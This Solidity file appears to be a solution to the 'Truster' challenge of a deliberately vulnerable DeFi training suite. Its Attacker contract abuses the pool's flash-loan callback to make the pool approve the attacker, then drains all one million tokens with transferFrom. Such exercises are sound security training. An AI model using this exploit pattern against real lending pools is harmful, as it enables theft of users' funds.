// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { TrusterLenderPool } from "./TrusterLenderPool.sol";
import { DamnValuableToken } from "../DamnValuableToken.sol";

contract Attacker {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address _pool, address _token) payable {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
        pool.flashLoan(0, address(this), _token, data);
        DamnValuableToken token = DamnValuableToken(_token);
        token.transferFrom(_pool, address(this), TOKENS_IN_POOL);
    }
}